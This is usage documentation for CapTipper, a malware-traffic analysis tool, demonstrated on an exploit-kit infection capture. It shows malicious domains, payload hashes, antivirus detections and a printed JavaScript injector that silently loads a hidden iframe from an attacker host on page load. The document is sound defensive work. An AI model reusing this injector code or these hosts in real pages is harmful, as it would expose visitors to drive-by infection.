=======
Usage
=======

Feeding CapTipper with a drive-by traffic capture (e.g. of an exploit kit) displays the user with the requests URI's that were sent and responses meta-data.
The user can at this point browse to http://127.0.0.1/<host>/[URI] and receive the response back to the browser.
In addition, an interactive shell is launched for deeper investigation using various commands such as: hosts, hexdump, info, ungzip, body, client, dump and more...

CapTipper is written in Python and requires Python 2.7 to function properly.
CapTipper was tested on Windows, Linux & Mac and doesn't require any installation; every prerequisites it might need is bundled into its project folder.

Basic Usage:

.. code:: sh

    ./CapTipper.py <PCAP_file> [arguments]

Arguments
==========

CapTipper accepts command line arguments:

-h, --help                  Print this help message and exit
-p PORT, --port PORT        Set web server port
-d FOLDER, --dump FOLDER    Dump all files and exit
-s, --server-off            Disable web server
-short, --short-url         Display shortened URI paths
-r FOLDER, --report FOLDER  Create JSON & HTML report
-g, --ungzip                Automatically ungzip responses
-u, --update                Update CapTipper to newest version

- ``--ungzip`` Automatically ungzip all objects but web-server still responds with the original response.

Console
=======

The Initialization of CapTipper outputs the conversations found between the client and the server in the following format:

[ID] : REQUEST URI -> SERVER RESPONSE TYPE (FILENAME) [SIZE IN BYTES] (Magic: $Whatype)

* ID: An assigned Id to the specific conversation
* REQUEST URI: The URI that was sent to the server in the GET request
* SERVER RESPONSE TYPE: The content-type returned in the server response header
* FILENAME: The filename can be a few things:

    1) Filename attribute given in the response header
    2) Derived from the URI
    3) Assigned by CapTipper if couldn't find any of the above
* SIZE IN BYTES: Response body size
* MAGIC: The file format as identified by the :doc:`Whatype` library

After Initialization, 2 things occur:

    1. CapTipper creates a pseudo-web server that behaves like the web server in the pcap
    2. An Interpreter is launched

The interpreter contains internal tools for further investigation of the objects in the PCAP file.

Opening a URI in the browser is simply by typing ``open`` along with the object id.
For more information on the web server, please see the :doc:`Webserver` chapter.

Following are details for all the currently available commands.

open
----
CapTipper launches a local :doc:`Webserver` imitating the web server(s) in the PCAP.
The ``open`` command gets a given conversation and launches the default browser to go to that URL on the local webserver.

Example:
::

    CT> open 0
    Opening http://localhost:80/ in default browser

log
----
Every request to the local webserver is logged and can be viewed using the ``log`` command:

::

    CT> log
    [2015-07-08T16:25:18.815575] 127.0.0.1 : GET / HTTP/1.1

convs
-----

``convs`` will display all conversations in the form they were displayed when CapTipper was launched.

::

    CT> convs
    Conversations Found:

    0:  /  -> text/html (0.html) [5.4 KB]  (Magic: GZ)
    1:  /seedadmin17.html  -> text/html (seedadmin17.html) [354.0 B]  (Magic: HTML)
    2:  /wp-includes/js/jquery/jquery.js?ver=1.7.2  -> application/javascript (jquery.js) [38.6 KB]  (Magic: GZ)
    3:  /15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html  -> text/html (15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html) [110.5 KB]  (Magic: HTML)
    4:  /wp-content/uploads/2014/01/MetroWest_COVER_Issue2_Feb2014.jpg  -> image/jpeg (MetroWest_COVER_Issue2_Feb2014.jpg) [341.8 KB]  (Magic: JPG)
    5:  /images/footer/3000melbourne.png  -> image/png (3000melbourne.png) [2.9 KB]  (Magic: PNG)
    6:  /images/footer/3207portmelbourne.png  -> image/png (3207portmelbourne.png) [3.0 KB]  (Magic: PNG)
    7:  /wp-content/uploads/2012/09/background1.jpg  -> image/jpeg (background1.jpg) [32.3 KB]  (Magic: JPG)
    8:  /00015d76d9b2rr9f/1415286120  -> application/octet-stream (00015d76.swf) [30.8 KB]  (Magic: SWF)
    9:  /00015d766423rr9f/1415286120  -> application/pdf (XykpdWhZZ2.pdf) [9.7 KB]  (Magic: PDF)
    10:  /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6  -> application/octet-stream (5.exe) [136.0 KB]  (Magic: EXE)
    11:  /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6;1  -> application/octet-stream (5.exe) [136.0 KB]  (Magic: EXE)
    12:  /00015d76rr9f/1415286120/7  -> application/octet-stream (7.exe) [136.0 KB]  (Magic: EXE)
    13:  /00015d761709rr9f/1415286120  -> application/octet-stream (00015d76.swf) [7.9 KB]  (Magic: XAP)
    14:  /00015d76rr9f/1415286120/8  -> application/octet-stream (8.exe) [136.0 KB]  (Magic: EXE)

hosts
-----

The ``hosts`` command allows us to take a bird-eye-view on the hosts and URIs involved in the traffic.

::

    CT> hosts
    Found Hosts:

     www.magmedia.com.au (182.160.157.199:80)
     ├-- /   [0]
     ├-- /wp-includes/js/jquery/jquery.js?ver=1.7.2   [2]
     ├-- /wp-content/uploads/2014/01/MetroWest_COVER_Issue2_Feb2014.jpg   [4]
     ├-- /images/footer/3000melbourne.png   [5]
     ├-- /images/footer/3207portmelbourne.png   [6]
     └-- /wp-content/uploads/2012/09/background1.jpg   [7]


     pixeltouchstudios.tk (108.61.196.84:80)
     └-- /seedadmin17.html   [1]


     grannityrektonaver.co.vu (173.244.195.17:80)
     ├-- /15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html   [3]
     ├-- /00015d76d9b2rr9f/1415286120   [8]
     ├-- /00015d766423rr9f/1415286120   [9]
     ├-- /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6   [10]
     ├-- /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6;1   [11]
     ├-- /00015d76rr9f/1415286120/7   [12]
     ├-- /00015d761709rr9f/1415286120   [13]
     └-- /00015d76rr9f/1415286120/8   [14]


head
-----

``head`` outputs a given conversations response header.

Following is its help message:
::

    Display header of response

    Usage: head <conv_id>


For example:
::

    CT> head 0
    Displaying header of object 0 (0.html):

    HTTP/1.1 200 OK
    Content-Encoding: gzip
    Vary: Accept-Encoding
    Transfer-Encoding: chunked
    Date: Thu, 06 Nov 2014 15:03:41 GMT
    Server: LiteSpeed
    Connection: close
    X-Powered-By: PHP/5.4.32
    X-Pingback: http://www.magmedia.com.au/xmlrpc.php
    Content-Type: text/html; charset=UTF-8
    Set-Cookie: slimstat_tracking_code=256799id.b66059145c9c6730b88376341fa0a97e; expires=Sun, 07-Dec-2014 15:03:41 GMT; path=/


body
----
body gets the conversation id as an argument and outputs the response body. Following is its help message:

::

    Displays the text representation of the body

    Usage: body <conv_id> [size=256]



By default, ``body`` displays the first 256 bytes of the object, but it can accept a second argument which indicates the amount of bytes of the response body to display.
it can also accept ``all`` as the second argument, which will return the entire body.

For example:
::

    CT> body 1 128
    Displaying body of object 1 (seedadmin17.html) [128 bytes]:

    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>302 Found</title>
    </head><body>
    <h1>Found</h1>
    <p>The doc

ungzip
------
Many times using the ``body`` command will result in an un-readable response due to use of the GZIP compression.

::

    CT> body 0
    Displaying body of object 0 (0.html) [256 bytes]:

    ▼     ♦♥─╜i{#╟ס╢√}~♣X╓t♥═"HJצg♀░→o½%Y▓╡ם║m┘CR║
    @a!▒P ╪כ        ╬o?≈‼╣TJ≥£≈\g╞jó╢\"#cן╚πg ÷ry≤~5↔O6םµ╦Vπ├ףף h|╛*ך╞½σh≤6_§ם╧ק╖כa╛ש.↨iπ╦┼á▌רl67¥ππ╤z╘^«╞╟ ÷∞°▀F╖כב▐hלכ═╦σ≥zZ4≤╓▌¢|╒Φg├σαv^,6φב=h╧≤═`╥\¶o
    ←▀↨π╧▐▌4ףf»≤π╢█h%חy{U▄╠≥A╤<n₧_┤?Φ=█▐▌_4/Z↨τ↨ק↨↨↨╟↨ח?^╢מ╟irq±┴i


``ungzip`` gets a conversation id as an argument and creates a new object
with the ungzipped data of the object

::

    CT> ungzip 0
     GZIP Decompression of object 0 (0.html) successful!
     New object created: 15

The new object created is added to the `objects` list and can be seen using the ``objects`` command:

::

    CT> objects
    Displaying Objects:

     ID   CID     TYPE          NAME
    ---- -----  -----------   --------
      0 | 0   | body        | 0.html
      1 | 1   | body        | seedadmin17.html
      2 | 2   | body        | jquery.js
      3 | 3   | body        | 15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html
      4 | 4   | body        | MetroWest_COVER_Issue2_Feb2014.jpg
      5 | 5   | body        | 3000melbourne.png
      6 | 6   | body        | 3207portmelbourne.png
      7 | 7   | body        | background1.jpg
      8 | 8   | body        | 00015d76.swf
      9 | 9   | body        | XykpdWhZZ2.pdf
     10 | 10  | body        | 5.exe
     11 | 11  | body        | 5.exe
     12 | 12  | body        | 7.exe
     13 | 13  | body        | 00015d76.swf
     14 | 14  | body        | 8.exe
     15 | 0   | ungzip      | ungzip-0.html     <---------- NEW UNGZIPPED OBJECT



req
----

``req`` gets the conversation id as an argument and outputs the request data.

For example:
::

    CT> req 0
    Displaying request for object 0 (0.html) [633 bytes]:

    GET / HTTP/1.1
    Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    Referer: http://www.google.com/url?url=http://www.magmedia.com.au/&rct=j&frm=1&q=&esrc=s&sa=U&ei=uItbVLWHHYGpyASK44CoCQ&ved=0CBUQFjAA&usg=AFQjCNHuIidJc6dJKT_wy-UruJtaHR9Mhg
    Accept-Language: en-US
    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
    Accept-Encoding: gzip, deflate
    Host: www.magmedia.com.au
    Connection: Keep-Alive

hexdump
--------
The ``hexdump`` command displays the hexdump of a given conversation object. like the ``body`` command,
it display the first 256 bytes of the objects but this can be changed by providing the second ``size`` argument.

Its help message:
::

    Display hexdump of given object

    Usage: hexdump <conv_id> [size=256]


For example:

::

    CT> hexdump 12
    Displaying hexdump of object 12 (7.exe) body [256 bytes]:

    0000   4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00    MZ..............
    0010   B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00    ........@.......
    0020   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
    0030   00 00 00 00 00 00 00 00 00 00 00 00 C8 00 00 00    ................
    0040   0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68    ........!..L.!Th
    0050   69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F    is program canno
    0060   74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20    t be run in DOS
    0070   6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00    mode....$.......
    0080   37 62 C4 DA 73 03 AA 89 73 03 AA 89 73 03 AA 89    7b..s...s...s...
    0090   F0 1F A4 89 72 03 AA 89 3C 21 A3 89 76 03 AA 89    ....r...<!..v...
    00A0   45 25 A7 89 72 03 AA 89 52 69 63 68 73 03 AA 89    E%..r...Richs...
    00B0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
    00C0   00 00 00 00 00 00 00 00 50 45 00 00 4C 01 03 00    ........PE..L...
    00D0   51 5C 5A 54 00 00 00 00 00 00 00 00 E0 00 0F 01    Q\ZT............
    00E0   0B 01 06 00 00 C0 01 00 00 70 00 00 00 00 00 00    .........p......
    00F0   14 13 00 00 00 10 00 00 00 D0 01 00 00 00 40 00    ..............@.

peinfo
------
The ``peinfo`` displays interesting and suspicious information regarding a binary file, based on the Malware Cookbook PE scanner.

It also supports using the ``-p`` argument to identify packers from the PEiD signature database.
Help message:
::

    Display PE info of the file

    Usage: peinfo <obj_id> [-p]

    OPTIONS:
         -p     -   Check for packers

For example:
::

    CT> peinfo 12
    Displaying PE info of object 12 (7.exe) [139264 bytes]:

    Meta-data
    ================================================================================
    Size:    139264 bytes
    MD5:     67291715c45c4594b8866e90fbf5c7c4
    SHA1:    a86dcb1d04be68a9f2d2373ee55cbe15fd299452
    Date:    0x545A5C51 [Wed Nov  5 17:20:17 2014 UTC]
    EP:      0x401314 .text 0/3
    CRC:     Claimed: 0x24dec, Actual: 0x2621d [SUSPICIOUS]

    Resource entries
    ================================================================================
    Name               RVA      Size     Lang         Sublang                  Type
    --------------------------------------------------------------------------------
    RT_ICON            0x22980  0xea8    LANG_NEUTRAL SUBLANG_NEUTRAL
    RT_ICON            0x218d8  0x10a8   LANG_NEUTRAL SUBLANG_NEUTRAL
    RT_ICON            0x21470  0x468    LANG_NEUTRAL SUBLANG_NEUTRAL
    RT_ICON            0x21108  0x368    LANG_NEUTRAL SUBLANG_NEUTRAL
    RT_ICON            0x20460  0xca8    LANG_NEUTRAL SUBLANG_NEUTRAL
    RT_GROUP_ICON      0x20414  0x4c     LANG_NEUTRAL SUBLANG_NEUTRAL
    RT_VERSION         0x201b0  0x264    LANG_ENGLISH SUBLANG_ENGLISH_US

    Sections
    ================================================================================
    Name       VirtAddr     VirtSize     RawSize      Entropy
    --------------------------------------------------------------------------------
    .text      0x1000       0x1b5d8      0x1c000      6.635876
    .data      0x1d000      0x2128       0x1000       0.000000
    .rsrc      0x20000      0x3828       0x4000       4.580442

    Version info
    ================================================================================
    Translation: 0x0409 0x04b0
    InternalName: ProV
    FileVersion: 3.07
    CompanyName: VSO Software
    Comments: All rights reserved
    ProductName: Filmf\xf6rderanstalten
    ProductVersion: 3.07
    OriginalFilename: ProV.exe

info
----

``info`` will display metadata related to a given conversation, such as:

- Server IP and PORT
- Packet sent time
- Host
- URI
- Referrer
- Request Method
- Result number
- Result content type
- File name
- File type as identified by Whatype
- Response size

Help message:
::

    CT> help info

    Display info on object

    Usage: info <conv_id>

For example:

::

    CT> info 1
    Info of conversation 1:

     SERVER IP   : 108.61.196.84:80
     TIME        : Thu, 11/06/14 15:02:38
     HOST        : pixeltouchstudios.tk
     URI         : /seedadmin17.html
     REFERER     : http://www.magmedia.com.au/
     METHOD      : GET
     RESULT NUM  : 302 Found
     RESULT TYPE : text/html
     FILE NAME   : seedadmin17.html
     MAGIC       : HyperText Markup Language (HTML)
     LENGTH      : 354 B

plugin
------
CapTipper supports external plugins.
Extensive information regarding the plugin infrastructure can be found in the :doc:`Plugins` chapter.

The ``plugin`` command allows the user to use plugins that are stored in the ``plugins\`` folder. Its help message:
::

    CT> help plugin
    Launching an external plugin (alias: p)

    usage: plugin <plugin_name / plugin_id> [-l] <*args>
         -l      - List all available plugins

    examples:
         plugin find_scripts
         plugin 1
         p find_scripts

List all available plugins:
::

    CT> plugin -l
    Loaded Plugins (3):
     0 : check_host - Checks if a given id's host is alive
     1 : find_scripts - Finds external scripts included in the object body
     2 : print_body - Prints the body of a conversation and ungzip if needed


* The ``plugin`` command can be also used by its alias ``p``.

Each plugin is assigned with a unique ID, so the use of the plugin can be done either by its name or by its ID.

For example, we can use the ``check_host`` plugin who has the id ``0`` assigned to it.
This plugin receives a conversation id as an argument and checks if the domain hosting the conversation URL is alive.
Let's use the plugin with conversation ``12``:

::

    CT> p 0 12
    Checking host grannityrektonaver.co.vu
    IP:PORT = 173.244.195.17:80
    [-] Server is dead


dump
----
The ``dump`` command write to disk a given object id or all files found in the PCAP.

Its help message:

::

    Dumps the object file to a given folder

    Usage: dump <conv_id> <path> [-e]

    Options:
       -e       - ignores executables

Examples:
::

    dump 4 c:\files\index.html
                Dumps object 4 to given path

    dump all c:\files
                 Dumps all files to folder by their found name

    dump all c:\files -e
                 Dumps all files to folder by their found name, without EXE files


objects
-------
The ``objects`` command display the objects list described in the :doc:`Core` chapter.

::

    CT> objects
    Displaying Objects:

     ID   CID     TYPE          NAME
    ---- -----  -----------   --------
      0 | 0   | body        | 0.html
      1 | 1   | body        | seedadmin17.html
      2 | 2   | body        | jquery.js
      3 | 3   | body        | 15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html
      4 | 4   | body        | MetroWest_COVER_Issue2_Feb2014.jpg
      5 | 5   | body        | 3000melbourne.png
      6 | 6   | body        | 3207portmelbourne.png
      7 | 7   | body        | background1.jpg
      8 | 8   | body        | 00015d76.swf
      9 | 9   | body        | XykpdWhZZ2.pdf
     10 | 10  | body        | 5.exe
     11 | 11  | body        | 5.exe
     12 | 12  | body        | 7.exe
     13 | 13  | body        | 00015d76.swf
     14 | 14  | body        | 8.exe




find
----
The ``find`` command searches for all occurrences of a given regex in a given conversation, or all conversations.

Its help message:
::

    Search for a regular expression in all or specific object

    Usage: find <obj_id / all> <pattern>


    Output data is displayed as follows:

       ([Line number] , [Offset from begining of file]) : [Found string]

It is advised to start CapTipper with the ``-g`` flag in order to automatically ungzip all objects and make the search more efficient.

Example searching for the domain `rabiorik` in all objects:
::

    CT> find all rabiorik
    Searching 'rabiorik' in all objects:

     0.html [0]:
        (777,50587) : t(){create_frame("http://rabiorik.ru/wlkzkir.cgi?default")

     wlkzkir.cgi [7]:
        (8,256) : 22 (@RELEASE@) Server at rabiorik.ru Port 80</address></b

Following, and example searching `create_frame` in a specific object:
::

    CT> find 0 create_frame
    Searching 'create_frame' in object 0 (0.html):

     (777,50213) : xt/javascript'>function create_frame(a){var b=document.getEle
     (777,50566) : true}}function bdsls4t(){create_frame("http://rabiorik.ru/wlkz

slice
-----
The command ``slice`` displays a specified range of bytes (substring) from an object.

Its help message:
::

    Returns bytes from offset in given length

    Usage: slice <obj_id> <offset> <len | 'eob'>

Following the previous use of ``find``, we can examine the "create_frame" javascript function by requesting 256 bytes from its starting position.
``slice`` accepts the object-id (0), the offset start (50213) and the length (256):
::

    CT> slice 0 50213 256
    Displaying 256 of bytes from offset 50213 in object 0 (0.html):

    create_frame(a){var b=document.getElementById('weqe');if(typeof(b)!='undefined'&&b!=null){}
    else{var c=document.createElement('iframe');c.id="weqe";c.style.width="0px";c.style.height="0px";
    c.style.border="0px";c.frameBorder="0";c.style.display="none";c.setA

It also includes support for ``EOB`` (End Of Block) detection.
This will tell ``slice`` to display code until the end of the current block we are looking at,
whether it's a class, a function or a statement (based on braces { }).

The ``eob`` argument is used instead of the length value, e.g:

::

    CT> slice 0 50213 eob
    Displaying 334 of bytes from offset 50213 in object 0 (0.html):

    create_frame(a){var b=document.getElementById('weqe');if(typeof(b)!='undefined'&&b!=null){}
    else{var c=document.createElement('iframe');c.id="weqe";c.style.width="0px";c.style.height="0px";
    c.style.border="0px";c.frameBorder="0";c.style.display="none";c.setAttribute("frameBorder","0");
    document.body.appendChild(c);c.src=a;return true}}

If we want to be able to read the code more conveniently, we can use the ``jsbeautify`` command.

jsbeautify
----------
The ``jsbeautify`` (JavaScript Beautify) command reformats the code to be more human-readable, very useful for deep inspection.

Its help message:
::

    Display JavaScript code after beautify

    Usage: jsbeautify <obj / slice> <object_id> <offset> <length>

    Example: jsbeautify slice <object_id> <offset> <len | eob>

    Example: jsbeautify obj <object_id>


``jsbeautify`` can accepts a conversation object and create a new one. (The new object can be dumped to the file system):

::

    CT> jsbeautify obj 8
     JavaScript Beautify of object 8 (jquery.ui.effect.min.js) successful!
     New object created: 16

Like ``ungzip``, The new object created can be seen using the ``objects``.

``jsbeautify`` can also accept the ``slice`` command seen in the previous section.

Example of the ``jsbeautify`` on the "create_frame" function in the javascript code, combined with the ``slice`` command.

::

    CT> jsbeautify slice 0 50213 512
    create_frame(a) {
        var b = document.getElementById('weqe');
        if (typeof(b) != 'undefined' && b != null) {} else {
            var c = document.createElement('iframe');
            c.id = "weqe";
            c.style.width = "0px";
            c.style.height = "0px";
            c.style.border = "0px";
            c.frameBorder = "0";
            c.style.display = "none";
            c.setAttribute("frameBorder", "0");
            document.body.appendChild(c);
            c.src = a;
            return true
        }
    }
    function bdsls4t() {
        create_frame("http://rabiorik.ru/wlkzkir.cgi?default")
    }
    try {
        if (window.attachEvent) {
            window.attachEvent('onload', bdsls4t)
        } else {
            if (window.onload) {
                var curronload = wi

vt
----
``vt`` sends a given object ids MD5 to VirusTotal to see if it is recognized by any of the Anti-Virus providers.

The use of ``vt`` requires a VirusTotal Public API key.

For example:

::

    CT> vt 14
     VirusTotal result for object 14 (8.exe):

     Detection: 46/57
     Last Analysis Date: 2015-04-09 12:37:31
     Report Link: https://www.virustotal.com/file/955e4e4a56bf80a30636b0c34673cdd6a889aff6569331a5336e1606e7c1050c/analysis/1428583051/

     Scan Result:
        MicroWorld-eScan	Trojan.GenericKD.1961906	12.0.250.0	20150409
        nProtect	Trojan.GenericKD.1961906	2015-04-09.02	20150409
        CAT-QuickHeal	TrojanPWS.Zbot.rw3	14.00	20150409
        McAfee	Generic.vd	6.0.5.614	20150409
        Malwarebytes	Trojan.Dorkbot.ED	1.75.0.1	20150409
        VIPRE	Trojan.Win32.Generic.pak!cobra	39190	20150409
        BitDefender	Trojan.GenericKD.1961906	7.2	20150409
        K7GW	Trojan ( 004b065c1 )	9.202.15539	20150409
        K7AntiVirus	Trojan ( 004b065c1 )	9.202.15538	20150409
        Agnitum	Trojan.Injector!qCiqLIlbpUs	5.5.1.3	20150408
        F-Prot	W32/Injector.OA	4.7.1.166	20150409
        Symantec	Infostealer.Limitail	20141.2.0.56	20150409
        Norman	Injector.HKVF	7.04.04	20150409
        TotalDefense	Win32/Tofsee.CQVQOaC	37.0.11540	20150409
        TrendMicro-HouseCall	TROJ_SPNV.01KC14	9.700.0.1001	20150409
        Avast	Win32:VB-AIWF [Trj]	8.0.1489.320	20150409
        Kaspersky	Trojan.Win32.VB.ctmy	15.0.1.10	20150409
        NANO-Antivirus	Trojan.Win32.Spambot.dippmr	0.30.10.952	20150409
        ViRobot	Trojan.Win32.R.Agent.139264[h]	2014.3.20.0	20150409
        Rising	PE:Malware.XPACK-HIE/Heur!1.9C48	25.0.0.17	20150409
        Ad-Aware	Trojan.GenericKD.1961906	12.0.163.0	20150409
        Emsisoft	Trojan.GenericKD.1961906 (B)	3.0.0.600	20150409
        Comodo	UnclassifiedMalware	21701	20150409
        F-Secure	Trojan.GenericKD.1961906	11.0.19100.45	20150409
        DrWeb	Trojan.Spambot.12689	7.0.12.3050	20150409
        Zillya	Trojan.VB.Win32.129714	2.0.0.2132	20150408
        TrendMicro	TROJ_SPNV.01KC14	9.740.0.1012	20150409
        McAfee-GW-Edition	BehavesLike.Win32.AAEH.ch	v2015	20150409
        Sophos	Mal/Generic-L	4.98.0	20150409
        Cyren	W32/Injector.CFDL-3956	5.4.16.7	20150409
        Avira	TR/Injector.139264.29	3.6.1.96	20150409
        Antiy-AVL	Trojan/Win32.SGeneric	1.0.0.1	20150409
        Microsoft	Backdoor:Win32/Tofsee.F	1.1.11502.0	20150409
        AhnLab-V3	Trojan/Win32.MDA	2015.04.09.00	20150408
        GData	Trojan.GenericKD.1961906	25	20150409
        ALYac	Trojan.GenericKD.1961906	1.0.1.4	20150409
        AVware	Trojan.Win32.Generic.pak!cobra	1.5.0.21	20150409
        Panda	Trj/WLT.B	4.6.4.2	20150408
        Zoner	Trojan.Tofsee.AX	1.0	20150407
        ESET-NOD32	Win32/Tofsee.AX	11448	20150409
        Tencent	Trojan.Win32.Qudamah.Gen.17	1.0.0.1	20150409
        Ikarus	Trojan-Spy.Agent	T3.1.8.9.0	20150409
        Fortinet	W32/BOVZ!tr	5.0.999.0	20150409
        AVG	Inject2.BDIT	15.0.0.4328	20150409
        Baidu-International	Trojan.Win32.VB.ctmy	3.5.1.41473	20150409
        Qihoo-360	HEUR/QVM03.0.Malware.Gen	1.0.0.1015	20150409


iframes
-------
The ``iframes`` command searches for iframe tags as part of the html source.

::

    CT> iframes 2
    Searching for iframes in object 2 (jquery.js)...
     1 iframe(s) Found!

     [I] 1 : http://pixeltouchstudios.tk/seedadmin17.html

client
------

Display all collected data on the client found in the PCAP.

::

    CT> client

    Client Info:

     IP               :  192.168.204.136
     MAC              :  00:0c:29:64:76:eb
     USER-AGENT       :  Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
     X-FLASH-VERSION  :  11,8,800,94


ziplist
--------
The ``ziplist`` command receives an object id holding a ZIP file and display all files and folders stored inside it.

For example:
::

    CT> ziplist 6
     12 Files found in zip object 6 (QrWusuR.jar):

     [Z] 1 : META-INF/
     [Z] 2 : META-INF/MANIFEST.MF
     [Z] 3 : bDNxrqYgNO.class
     [Z] 4 : dNMU.class
     [Z] 5 : dxQegSHi.class
     [Z] 6 : EzAD.class
     [Z] 7 : ICrWA.class
     [Z] 8 : lcaOISBn.class
     [Z] 9 : pmd.class
     [Z] 10 : thXEdm.class
     [Z] 11 : YWbTSCCIk.class
     [Z] 12 : eqx.ps

output
-------
The ``output`` command logs all console commands and results to a file.
This is done by overriding ``sys.stdout``.
::

    CT> output /Users/omriher/Temp/Nuclear-110615.txt
    Logging to /Users/omriher/Temp/Nuclear-110615.txt

The logging only includes data from after using the ``output`` command.
In order to stop logging use ``stop`` as the command argument.

::

    CT> output stop
    Stopped logging to /Users/omriher/Temp/Nuclear-110615.txt


strings
--------
The ``strings`` command gets an object id and returns all strings found in that object.

For example:
::

    CT> strings 14
    Strings found in object 14 (8.exe) [139264 bytes]:
    !This program cannot be run in DOS mode.
    Richs
    .text
    `.data
    .rsrc
    MSVBVM60.DLL
    Meistillustriertes
    JGd:O
    Kontrollmodus
    Baustoffkartelle5
    Kontrollmodus
    Kanonenfeuerunterst
    tzungen57
    ...


hashes
-------
The ``hashes`` command shows all available hashes of a given object.

::

    CT> hashes 14
     Hashes of object 14 (8.exe):

     md5       :   67291715c45c4594b8866e90fbf5c7c4
     sha1      :   a86dcb1d04be68a9f2d2373ee55cbe15fd299452
     sha224    :   6cc5585425cbb8b656ac4d12ce6331561df705787a0f8036b5f47eed
     sha256    :   955e4e4a56bf80a30636b0c34673cdd6a889aff6569331a5336e1606e7c1050c
     sha384    :   a207d38c964a0736adb86e74ea20ae5737afea9bfc87b7126ebb6d628432f6261dcef15cacf3b3bc14b072374dadf676
     sha512    :   703a9a69239ffe3bddf44fecf09136cb1e9872708d8e3d2d39f9904a4cc075d9e63d6b421bea8f1affeef855f8d9c5b903a517779777febaa84521824b4a07e1
